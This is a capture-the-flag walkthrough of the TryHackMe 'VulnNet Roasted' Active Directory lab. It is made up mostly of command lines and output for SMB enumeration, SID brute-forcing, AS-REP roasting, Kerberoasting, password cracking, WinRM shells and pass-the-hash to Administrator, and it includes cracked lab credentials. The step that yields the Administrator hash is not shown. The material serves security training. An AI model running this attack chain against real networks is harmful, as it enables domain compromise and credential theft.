---
title: Vulnnet Roasted
date: '2024-12-30'
category: tryhackme
tags: tryhackme, ctf
description: Detailed technical walkthrough and security analysis for the Vulnnet
  Roasted machine on TryHackMe.
slug: vulnnet---roasted
---
> roasted
---
roasted
---


> Target - 10.201.41.120

> First scan target using nmap

```
nmap -sC -sV -Pn -n -A 10.201.41.120
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-10 07:18 EDT
Nmap scan report for 10.201.41.120
Host is up (0.39s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-10 11:18:39Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-10T11:19:27
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   385.19 ms 10.21.0.1
2   ... 3
4   418.49 ms 10.201.41.120

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 134.23 seconds

```




```
❯ smbclient -L //10.201.41.120 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.201.41.120 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```



```
❯ smbclient //10.201.41.120/VulnNet-Enterprise-Anonymous
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
mkfifo         more           mput           newer          notify         
open           posix          posix_encrypt  posix_open     posix_mkdir    
posix_rmdir    posix_unlink   posix_whoami   print          prompt         
put            pwd            q              queue          quit           
readlink       rd             recurse        reget          rename         
reput          rm             rmdir          showacls       setea          
setmode        scopy          stat           symlink        tar            
tarmode        timeout        translate      unlock         volume         
vuid           wdel           logon          listconnect    showconnect    
tcon           tdis           tid            utimes         logoff         
..             !              
smb: \> ls
  .                                   D        0  Fri Mar 12 21:46:40 2021
  ..                                  D        0  Fri Mar 12 21:46:40 2021
  Enterprise-Operations.txt           A      467  Thu Mar 11 20:24:34 2021
  Enterprise-Safety.txt               A      503  Thu Mar 11 20:24:34 2021
  Enterprise-Sync.txt                 A      496  Thu Mar 11 20:24:34 2021

                8771839 blocks of size 4096. 4532060 blocks available
smb: \> get Enterprise-Operations.txt
getting file \Enterprise-Operations.txt of size 467 as Enterprise-Operations.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> get Enterprise-Safety.txt
getting file \Enterprise-Safety.txt of size 503 as Enterprise-Safety.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> get Enterprise-Sync.txt
getting file \Enterprise-Sync.txt of size 496 as Enterprise-Sync.txt (0.2 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> exit

```



```
❯ smbclient //10.201.41.120/VulnNet-Business-Anonymous
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Mar 12 21:46:40 2021
  ..                                  D        0  Fri Mar 12 21:46:40 2021
  Business-Manager.txt                A      758  Thu Mar 11 20:24:34 2021
  Business-Sections.txt               A      654  Thu Mar 11 20:24:34 2021
  Business-Tracking.txt               A      471  Thu Mar 11 20:24:34 2021

                8771839 blocks of size 4096. 4532005 blocks available
smb: \> get Business-Manager.txt
getting file \Business-Manager.txt of size 758 as Business-Manager.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> get Business-Sections.txt
getting file \Business-Sections.txt of size 654 as Business-Sections.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> get Business-Tracking.txt
getting file \Business-Tracking.txt of size 471 as Business-Tracking.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> exit

```



```
❯ lookupsid.py anonymous@10.201.22.118
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at 10.201.22.118
[*] StringBinding ncacn_np:10.201.22.118[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)


```

```
❯ python3 GetNPUsers.py vulnnet-rst.local/ -dc-ip 10.201.33.149 -usersfile /home/kali/tryhackme/VulnNet/userlist.txt -no-pass -request -outputfile kerberos-users-found
Impacket v0.13.0.dev0+20250820.203717.835623ae - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:dc5380f13ab22f3fa646cb0d3074fe91$36e94465959692d10c81f29ade6e7f2086f2b2ab74b56080b88bb96c01d4ec564b072c398ae7d0e4f4a6afe4e8fd9971ae813f6d43f838e82173c4c6e8fc7f443dd96aeffd250d05111750e4995230e3117ee5c2074e4000d8d134a11649c25580d1252e61f00883f2dee7c06a7765c9c1e9d38e238b16b6533e8bd0b14d2f04618ac694c8a649ef5674f17e25f5f92ef2eb2eb4df39545fd79a2fcd96a67098e99a979e69a06fa0f4891f48a30bc0f14ed2f004da37882b2f7397d278a23547d80bc918d1f75aae60cbcb133c8336a32327536cb905baed0aabed14992dcfccb51ea12c7841ca535fb2d902efa7986c747cbc9634c3
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set


```


```
❯ john --format=krb5asrep hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tj072889*        (?)     
1g 0:00:00:03 DONE (2025-11-02 12:44) 0.3174g/s 1009Kp/s 1009Kc/s 1009KC/s tjalling..tj0216044
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

```

```
❯ python3 GetUserSPNs.py 'vulnnet-rst.local/t-skid:tj072889*' -dc-ip 10.201.33.149 -request

Impacket v0.13.0.dev0+20250820.203717.835623ae - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-11 14:45:09.913979  2021-03-13 18:41:17.987528             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$19a2b4d2a99203a39f091aebc4cb031b$0831e5589dae7b4f0b296d3cc77bdb9cda7fa26e76886ff5e965faaaa55be06ee48176d3d3a5bb7133080bfc93b70c981269f8ae07f4501340cf2a0c683fef8c652ea4439da16ea3135c96378b15a275c14ba9c5435ae73a608a1333041ea89c22d2806aad1cd01c76ba79542d28e237e2e6bbcb9eee9d2384a291f089280a54e43ca7abf910709a1d9956de7408d7c696d8a6d4040500a58aa6b8e77645626ba6c131ec5e00749297c96bf1b203e0fcbbac640b6ea0fbda73ffd6d5c507a6a76f945b4e2afa0ec6e18651badcb97fba1eca2c95c923f4cf65a0d0eb0d999c7bd4f1e978ae2b38ee07fd163fb56700136184f3edb97f4beb7e2eac4d27114b8181ab7ba2e6b236b22b493fa90aee9ddecb3aba56345d69182ef172a647180ffafeecb48462ceaa0fc176ad504a4290b120e8bb32d018783c24dd75986dfc34bcf6f724a0985c6cf27225a8c8ad8c81c6ca6bdc3c36229e779b505b5190f124742a2216f913ddd218621ac0d078a8e6dc768ab2c64b3d7468cc1c24375d32ffe650a7c59b9792083fe39945a8f3b079e21a76a95fa3b4affc499290ce79203279485d957cda39f62f34d70b496de99898171b5024b300f80b64ae887bc7a81b8e17d54b734d116847edf4ed30cf98363c73ff0727c00e187c5c2dd4ded98b52a3c50f42e210b2d8bbfc1d0219506835b5435a883608e68f263344943fc063ac918bdbfeae642bf81e69a08dee3ebe02810600ab2886b7353489704e0b0973955ff1ffb9d0d6453427d08541bf1c2367f28cbffc5ac0c4074818a307c5bd1a9ef62c2a7be29acd5d35b7c9fa2e09677ffdc760f31cecc0434cb63cbc5614ef89655535becd4846b92d726cfa6268e23c19aa30a16f66ae08d67844911e918bc5f357a12d94d172036bd4473d444bf0545e05f64b24e87953260aed51c9d5b97c0d703dd92c57d056cb5f32b001334abbcf1c89bc5b94a2f178942d16704df50db2a19ec925e22ac430ef13b0fdcf8f7a5a3e1185b0dcbe657760fa5508e425c03a7e07e012d82cf9f5444179f07da5b983b00066fba17adb6bb1b2dfb82a32af7e74ee62a0e29acd75c147920a9b78d82a9eb5f5c25c1a6b78f68a0c2074fc9fd868bb71296aa5c4b8ca1b0c7bc748fb7e95db50425cfe63467287b65c2e2657a69f791ec735aadd556193a6fdd7a1e43d9c9fca4164c2b267edf36411d43ef9816755104cd5d1e2558b3485c3fac6a4ee397db6644989d798c2512b8f228e67ed1914bb90cc2191552be8aa80875d73dda2453ef4fe06114efcdba8674aa9b7fcacb0e3e212e4778333ad2bd962b8e5f3650e1c591a6ea7b23fb8ae772e8b82372b1abaa81f71ead3c8f9e2ad9d6f5ef13bc67a7b3fc5341a194fe8c570

```

```
❯ john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs hash1.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ry=ibfkfv,s6h,   (?)     
1g 0:00:00:02 DONE (2025-11-02 13:07) 0.3921g/s 1611Kp/s 1611Kc/s 1611KC/s ryan2lauren..ry=iIyD{N
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

```
❯ evil-winrm -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,' -i 10.201.33.149
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Documents> ls
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Documents> cd ..
*Evil-WinRM* PS C:\Users\enterprise-core-vn> ls


    Directory: C:\Users\enterprise-core-vn


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        3/13/2021   3:43 PM                Desktop
d-r---        3/13/2021   3:42 PM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos


*Evil-WinRM* PS C:\Users\enterprise-core-vn> cd Desktop
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> ls


    Directory: C:\Users\enterprise-core-vn\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/13/2021   3:43 PM             39 user.txt



```

```
❯ smbclient //10.201.22.169/SYSVOL -U enterprise-core-vn
Password for [WORKGROUP\enterprise-core-vn]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 11 14:19:49 2021
  ..                                  D        0  Thu Mar 11 14:19:49 2021
  vulnnet-rst.local                  Dr        0  Thu Mar 11 14:19:49 2021

                8540159 blocks of size 4096. 4295508 blocks available
smb: \> cd vulnnet-rst.local
smb: \vulnnet-rst.local\> ls
  .                                   D        0  Thu Mar 11 14:23:40 2021
  ..                                  D        0  Thu Mar 11 14:23:40 2021
  DfsrPrivate                      DHSr        0  Thu Mar 11 14:23:40 2021
  Policies                            D        0  Thu Mar 11 14:20:26 2021
  scripts                             D        0  Tue Mar 16 19:15:49 2021

                8540159 blocks of size 4096. 4292738 blocks available
smb: \vulnnet-rst.local\> get scripts
NT_STATUS_FILE_IS_A_DIRECTORY opening remote file \vulnnet-rst.local\scripts
smb: \vulnnet-rst.local\> cd scripts
smb: \vulnnet-rst.local\scripts\> ls
  .                                   D        0  Tue Mar 16 19:15:49 2021
  ..                                  D        0  Tue Mar 16 19:15:49 2021
  ResetPassword.vbs                   A     2821  Tue Mar 16 19:18:14 2021
ge
                8540159 blocks of size 4096. 4295363 blocks available
smb: \vulnnet-rst.local\scripts\> get ResetPassword.vbs
getting file \vulnnet-rst.local\scripts\ResetPassword.vbs of size 2821 as ResetPassword.vbs (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)
smb: \vulnnet-rst.local\scripts\>

```

> so after checking vbs found username & pwd

```

strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"


```

```
❯ evil-winrm -u Administrator -H aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d -i 10.201.22.169 -N
                                        
Evil-WinRM shell v3.7
                                        
Error: Invalid hash format
❯ evil-winrm -u Administrator -H aad3b435b51404eeaad3b435b51404ee -i 10.201.22.169 -N
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completion is disabled
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1
❯ evil-winrm -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d -i 10.201.22.169 -N
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completion is disabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> ls


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        3/11/2021   9:38 AM                3D Objects
d-r---        3/11/2021   9:38 AM                Contacts
d-r---        3/13/2021   3:31 PM                Desktop
d-r---        3/11/2021   9:38 AM                Documents
d-r---        3/11/2021   9:38 AM                Downloads
d-r---        3/11/2021   9:38 AM                Favorites
d-r---        3/11/2021   9:38 AM                Links
d-r---        3/11/2021   9:38 AM                Music
d-r---        3/11/2021   9:38 AM                Pictures
d-r---        3/11/2021   9:38 AM                Saved Games
d-r---        3/11/2021   9:38 AM                Searches
d-r---        3/11/2021   9:38 AM                Videos


*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/13/2021   3:34 PM             39 system.txt

```